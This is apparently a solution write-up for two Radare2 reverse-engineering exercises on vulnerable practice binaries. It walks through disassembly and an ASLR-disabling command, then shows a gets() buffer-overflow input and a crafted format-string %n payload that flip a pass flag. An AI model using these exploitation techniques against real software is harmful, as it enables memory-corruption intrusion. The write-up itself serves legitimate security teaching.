Solutions for Radare2
=====================

Each of these exercises contains a common vulnerability, which can be exploited. There are also other solutions to solve the exercises, but we only mention them and concentrate on the unsafe functions used.


Disable ASRL in Linux: `echo 0 > /proc/sys/kernel/randomize_va_space`

Please do not forget to re-enable it!

_Note: these exercises could also be solved very easily be brute-forcing the input or with the help of other programs like `ltrace`. But it is sometimes much more clear what is going on when we use a binary analyzation tool for this (especially for more complex binaries)._

Exercise 1
----------

We load the program with `r2 -Ad ./ex1` and take a look at the program (`s main` `pdf`)
```
/ (fcn) sym.main 224
|          ; var int local_0      @ ebp-0x0
|          ; var int local_1      @ ebp-0x4
|          ; var int local_3      @ ebp-0xc
|          ; var int local_4      @ ebp-0x10
|          ; var int local_6_2    @ ebp-0x1a
|          ; var int local_7_3    @ ebp-0x1f
|          ; DATA XREF from 0x080483c7 (entry0)
|          ;-- main:
|          ;-- sym.main:
|          0x080484ab    8d4c2404       lea ecx, dword [esp + 4]        ; 0x4  ; 4
|          0x080484af    83e4f0         and esp, 0xfffffff0
|          0x080484b2    ff71fc         push dword [ecx - 4]
|          0x080484b5    55             push ebp
|          0x080484b6    89e5           mov ebp, esp
|          0x080484b8    51             push ecx
|          0x080484b9    83ec24         sub esp, 0x24
|          0x080484bc    c745f4000000.  mov dword [ebp-local_3], 0
|          0x080484c3    83ec0c         sub esp, 0xc
|          0x080484c6    6810860408     push str.Enter_pin_:           ; "Enter pin : " @ 0x8048610
|          0x080484cb    e890feffff     call sym.imp.puts ;sym.imp.puts(unk)
|          0x080484d0    83c410         add esp, 0x10
|          0x080484d3    83ec0c         sub esp, 0xc
|          0x080484d6    8d45e6         lea eax, dword [ebp-local_6_2]
|          0x080484d9    50             push eax
|          0x080484da    e871feffff     call sym.imp.gets ;sym.imp.gets(unk)
|          0x080484df    83c410         add esp, 0x10
|          0x080484e2    e899feffff     call sym.imp.rand ;sym.imp.rand()
|          0x080484e7    89c1           mov ecx, eax
|          0x080484e9    baad8bdb68     mov edx, 0x68db8bad
|          0x080484ee    89c8           mov eax, ecx
|          0x080484f0    f7ea           imul edx
|          0x080484f2    c1fa0c         sar edx, 0xc
|          0x080484f5    89c8           mov eax, ecx
|          0x080484f7    c1f81f         sar eax, 0x1f
|          0x080484fa    29c2           sub edx, eax
|          0x080484fc    89d0           mov eax, edx
|          0x080484fe    8945f0         mov dword [ebp-local_4], eax
|          0x08048501    8b45f0         mov eax, dword [ebp-local_4]
|          0x08048504    69c010270000   imul eax, eax, 0x2710
|          0x0804850a    29c1           sub ecx, eax
|          0x0804850c    89c8           mov eax, ecx
|          0x0804850e    8945f0         mov dword [ebp-local_4], eax
|          0x08048511    83ec04         sub esp, 4
|          0x08048514    ff75f0         push dword [ebp-local_4]
|          0x08048517    681d860408     push 0x804861d
|          0x0804851c    8d45e1         lea eax, dword [ebp-local_7_3]
|          0x0804851f    50             push eax
|          0x08048520    e86bfeffff     call sym.imp.sprintf ;sym.imp.sprintf(unk, unk, unk)
|          0x08048525    83c410         add esp, 0x10
|          0x08048528    83ec08         sub esp, 8
|          0x0804852b    8d45e1         lea eax, dword [ebp-local_7_3]
|          0x0804852e    50             push eax
|          0x0804852f    8d45e6         lea eax, dword [ebp-local_6_2]
|          0x08048532    50             push eax
|          0x08048533    e808feffff     call sym.imp.strcmp             ; sub.strcmp_92_33c+0x4 ;sub.strcmp_92_33c(unk, unk) ; sym.imp.strcmp
|          0x08048538    83c410         add esp, 0x10
|          0x0804853b    85c0           test eax, eax
|      ,=< 0x0804853d    7412           je 0x8048551                  
|      |   0x0804853f    83ec0c         sub esp, 0xc
|      |   0x08048542    6820860408     push str.Nope                  ; "Nope " @ 0x8048620
|      |   0x08048547    e814feffff     call sym.imp.puts ;sym.imp.puts(unk)
|      |   0x0804854c    83c410         add esp, 0x10
|     ,==< 0x0804854f    eb17           jmp 0x8048568                 
|     ||   ; JMP XREF from 0x0804853d (sym.main)
|     |`-> 0x08048551    83ec0c         sub esp, 0xc
|     |    0x08048554    6828860408     push str.Wow_..._you_guessed_right__i_allow_you_to_pass ; "Wow ... you guessed right, i allow you to pass " @ 0x8048628
|     |    0x08048559    e802feffff     call sym.imp.puts ;sym.imp.puts(unk)
|     |    0x0804855e    83c410         add esp, 0x10
|     |    0x08048561    c745f4010000.  mov dword [ebp-local_3], 1
|     |    ; JMP XREF from 0x0804854f (sym.main)
|     `--> 0x08048568    837df400       cmp dword [ebp-local_3], 0
|    ,===< 0x0804856c    7410           je 0x804857e                  
|    |     0x0804856e    83ec0c         sub esp, 0xc
|    |     0x08048571    6858860408     push str.WIN                   ; "WIN " @ 0x8048658
|    |     0x08048576    e8e5fdffff     call sym.imp.puts ;sym.imp.puts(unk)
|    |     0x0804857b    83c410         add esp, 0x10
|    |     ; JMP XREF from 0x0804856c (sym.main)
|    `---> 0x0804857e    b800000000     mov eax, 0
|          0x08048583    8b4dfc         mov ecx, dword [ebp-local_1]
|          0x08048586    c9             leave
|          0x08048587    8d61fc         lea esp, dword [ecx - 4]
\          0x0804858a    c3             ret
```

The goal of this exercises is that we get the 'WIN' message displayed. This happens at line `e8e5fdffff`. The conditional jump for this `printf` is done in line `0x08048568`. If `local_3` is `0`, the programs exits, if it is not then the wanted message is printed.

What else happens in this function?

- First, we have some initialization (`0x080484ab`-`0x080484bc`)
- Then the user has to input a pin (`0x080484c3`-`0x080484df`)
- Next, a random number is generated in converted to a string (`0x080484e2`-`0x08048525`)
- And finally, the pin, which the user entered, is compared to the generated pin and if it is right, `local_3` is set to `1`

So basically, we have a 1/10000 chance to guess the string.

Now let's think about what we can do now:
1. initialize `local_3` to 1
2. alter the conditional jump to display 'WIN' if we are false (or replace it with a 'NOP' to remove it)
3. the random generator is not initialized, so the number is always the same -> we could sniff it
4. perhaps there are some unsafe functions used

Since point 1-3 are trivial to do, we concentrate on point 4.

When checking the functions used, we see that `gets` is an unsafe function, because the buffer size is not checked (-> buffer overflow).

To find out if we can use this we have to take a look at the local variables:
```
local_0      @ ebp-0x0
local_1      @ ebp-0x4
local_3      @ ebp-0xc
local_4      @ ebp-0x10
local_6_2    @ ebp-0x1a
local_7_3    @ ebp-0x1f
```

The interesting local variables for us are the buffer (`local_6_2`) and the 'token' to pass (`local_3`). Since we need to overwrite parts of `local_3`, we have to write at least 15 (10 for the buffer size and 4 because of local_4) characters to the buffer.

Let's test this:
```
./ex1
Enter pin : 
12345678901234
Nope 

./ex1
Enter pin : 
123456789012345
Nope 
WIN 
```


Exercise 2
----------

Again, we take a first look at the main function (`r2 -Ad ./ex2 test`, `s main`, `pdf`). Since we already were talking about other options to solve these exercises, we only concentrate here on the wrong usage of functions.

```
/ (fcn) sym.main 252
|          ; var int local_0      @ ebp-0x0
|          ; var int local_1      @ ebp-0x4
|          ; var int local_3      @ ebp-0xc
|          ; var int local_4      @ ebp-0x10
|          ; var int local_6_2    @ ebp-0x1a
|          ; var int local_9      @ ebp-0x24
|          ; DATA XREF from 0x080483f7 (entry0)
|          ;-- main:
|          ;-- sym.main:
|          0x080484db    8d4c2404       lea ecx, dword [esp + 4]        ; 0x4  ; 4
|          0x080484df    83e4f0         and esp, 0xfffffff0
|          0x080484e2    ff71fc         push dword [ecx - 4]
|          0x080484e5    55             push ebp
|          0x080484e6    89e5           mov ebp, esp
|          0x080484e8    51             push ecx
|          0x080484e9    83ec24         sub esp, 0x24
|          0x080484ec    89c8           mov eax, ecx
|          0x080484ee    c745f4000000.  mov dword [ebp-local_3], 0
|          0x080484f5    833802         cmp dword [eax], 2              ; [0x2:4]=-1 ; 2
|      ,=< 0x080484f8    7420           je 0x804851a                  
|      |   0x080484fa    8b4004         mov eax, dword [eax + 4]        ; [0x4:4]=-1 ; 4
|      |   0x080484fd    8b00           mov eax, dword [eax]
|      |   0x080484ff    83ec08         sub esp, 8
|      |   0x08048502    50             push eax
|      |   0x08048503    6820880408     push str.usage:__s_password    ; "usage: %s password" @ 0x8048820
|      |   0x08048508    e863feffff     call sym.imp.printf ;sym.imp.printf(unk, unk)
|      |   0x0804850d    83c410         add esp, 0x10
|      |   0x08048510    b8ffffffff     mov eax, sym.imp.__gmon_start__ ; sym.imp.__gmon_start__
|     ,==< 0x08048515    e9b5000000     jmp 0x80485cf                 
|     ||   ; JMP XREF from 0x080484f8 (sym.main)
|     |`-> 0x0804851a    8b4004         mov eax, dword [eax + 4]        ; [0x4:4]=-1 ; 4
|     |    0x0804851d    83c004         add eax, 4
|     |    0x08048520    8b00           mov eax, dword [eax]
|     |    0x08048522    83ec04         sub esp, 4
|     |    0x08048525    50             push eax
|     |    0x08048526    6a0a           push 0xa                       ; 10
|     |    0x08048528    8d45e6         lea eax, dword [ebp-local_6_2]
|     |    0x0804852b    50             push eax
|     |    0x0804852c    e86ffeffff     call sym.imp.snprintf ;sym.imp.snprintf(unk, unk, unk)
|     |    0x08048531    83c410         add esp, 0x10
|     |    0x08048534    e877feffff     call sym.imp.rand ;sym.imp.rand()
|     |    0x08048539    99             cdq
|     |    0x0804853a    6a02           push 2                         ; 2
|     |    0x0804853c    6800e40b54     push 0x540be400
|     |    0x08048541    52             push edx
|     |    0x08048542    50             push eax
|     |    0x08048543    e898000000     call sym.__moddi3 ;sym.__moddi3(unk, unk, unk, unk)
|     |    0x08048548    83c410         add esp, 0x10
|     |    0x0804854b    8945f0         mov dword [ebp-local_4], eax
|     |    0x0804854e    83ec04         sub esp, 4
|     |    0x08048551    ff75f0         push dword [ebp-local_4]
|     |    0x08048554    6833880408     push 0x8048833
|     |    0x08048559    8d45dc         lea eax, dword [ebp-local_9]
|     |    0x0804855c    50             push eax
|     |    0x0804855d    e85efeffff     call sym.imp.sprintf ;sym.imp.sprintf(unk, unk, unk)
|     |    0x08048562    83c410         add esp, 0x10
|     |    0x08048565    83ec08         sub esp, 8
|     |    0x08048568    8d45e6         lea eax, dword [ebp-local_6_2]
|     |    0x0804856b    50             push eax
|     |    0x0804856c    8d45dc         lea eax, dword [ebp-local_9]
|     |    0x0804856f    50             push eax
|     |    0x08048570    e8ebfdffff     call sym.imp.strcmp             ; sub.strcmp_196_35c+0x4 ;sub.strcmp_196_35c(unk, unk) ; sym.imp.strcmp
|     |    0x08048575    83c410         add esp, 0x10
|     |    0x08048578    85c0           test eax, eax
|    ,===< 0x0804857a    7421           je 0x804859d                  
|    ||    0x0804857c    83ec0c         sub esp, 0xc
|    ||    0x0804857f    8d45e6         lea eax, dword [ebp-local_6_2]
|    ||    0x08048582    50             push eax
|    ||    0x08048583    e8e8fdffff     call sym.imp.printf ;sym.imp.printf(unk)
|    ||    0x08048588    83c410         add esp, 0x10
|    ||    0x0804858b    83ec0c         sub esp, 0xc
|    ||    0x0804858e    6836880408     push str.was_incorrect         ; " was incorrect " @ 0x8048836
|    ||    0x08048593    e8e8fdffff     call sym.imp.puts ;sym.imp.puts(unk)
|    ||    0x08048598    83c410         add esp, 0x10
|   ,====< 0x0804859b    eb17           jmp 0x80485b4                 
|   ||     ; JMP XREF from 0x0804857a (sym.main)
|   |`---> 0x0804859d    83ec0c         sub esp, 0xc
|   | |    0x080485a0    6848880408     push str.Wow_..._you_guessed_right__i_allow_you_to_pass ; "Wow ... you guessed right, i allow you to pass " @ 0x8048848
|   | |    0x080485a5    e8d6fdffff     call sym.imp.puts ;sym.imp.puts(unk)
|   | |    0x080485aa    83c410         add esp, 0x10
|   | |    0x080485ad    c745f4010000.  mov dword [ebp-local_3], 1
|   |      ; JMP XREF from 0x0804859b (sym.main)
|   `----> 0x080485b4    837df400       cmp dword [ebp-local_3], 0
|  ,=====< 0x080485b8    7410           je 0x80485ca                  
|  |  |    0x080485ba    83ec0c         sub esp, 0xc
|  |  |    0x080485bd    6878880408     push str.WIN                   ; "WIN " @ 0x8048878
|  |  |    0x080485c2    e8b9fdffff     call sym.imp.puts ;sym.imp.puts(unk)
|  |  |    0x080485c7    83c410         add esp, 0x10
|  |       ; JMP XREF from 0x080485b8 (sym.main)
|  `-----> 0x080485ca    b800000000     mov eax, 0
|     |    ; JMP XREF from 0x08048515 (sym.main)
|     `--> 0x080485cf    8b4dfc         mov ecx, dword [ebp-local_1]
|          0x080485d2    c9             leave
|          0x080485d3    8d61fc         lea esp, dword [ecx - 4]
\          0x080485d6    c3             ret
```
Well, at first this looks not too be here, but let's see where the entered password (`argv[1]`) is handled.
it is used at the `snprintf` (`0x0804851a`-`0x0804852c`) at the third parameter. This doesn't look too bad, because `snprintf` should be a safe function, but there was a fatal error here, because the third parameter is the format-string.

You can find a good explanation about format-string exploitation [here](https://www.exploit-db.com/docs/28476.pdf)

So we need to find a parameter with the right length to manipulate a given address. For this we just use `ltrace`
```
ltrace ./ex2 BBAAAA%X%X%X%X%X%X

__libc_start_main(0x80484db, 2, 0xffd5b0b4, 0x80487a0 <unfinished ...>
snprintf("BBAAAAF75", 10, "BBAAAA%X%X%X%X%X%X", 0xf75f1fd1, 0x2, 0xffd5b0b4, 0xf76089c0, 0x424287eb, 0x41414141)                  = 47
rand(2, 0xffd5b0b4, 0xf76089c0, 0x424287eb)                                                                                       = 0x6b8b4567
sprintf("1804289383", "%i", 1804289383)                                                                                           = 10
strcmp("1804289383", "")                                                                                                          = 1
printf("")                                                                                                                        = 0
puts(" was incorrect " was incorrect 
)                                                                                                           = 16
+++ exited (status 0) +++
```
Here we have `0x41414141` as the last parameter. So our next step is to find the address of the flag, which we need to manipulate to pass check of the 'WIN' string.

To do this, we start radare and set a breakpoint (e.g. at `snprintf`) and look at the registers:
```
[0x080484db]> db  0x0804852c
[0x080484db]> dc
hit breakpoint at: 804852c
r_debug_select: 3200 1
[0x0804852c]> dr
eip = 0x0804852c
oeax = 0xffffffff
eax = 0xffffd3be
ebx = 0x00000000
ecx = 0xffffd3f0
edx = 0xffffd414
esp = 0xffffd3a0
ebp = 0xffffd3d8
esi = 0x00000002
edi = 0xf7faf000
eflags = 0x00000296
```

Since `local_3` is the flag and has the address `ebp-0xc`, we can calculate it easily -> `0xFFFFD3CC`

So, now we restart radare and try our manipulated input:

`r2 -Ad ./ex2 $(printf "BB\xCC\xD3\xFF\xFF")%%X%X%X%X%X%n`

When we run the program now with `dc`, we get this output:
`
[0xf7fdaa90]> dc
 was incorrect 
WIN 
r_debug_select: 3234 1
`

So we successfully managed to alter the flag-variable.

However, there are some downsides to this solution:
- when `/proc/sys/kernel/randomize_va_space` is not 0, the address changes, so it is not easy to find the right one
- this only works when the program is executed in radare2 (or for example `ltrace`), but to fix this is quiet complicated and not handled here.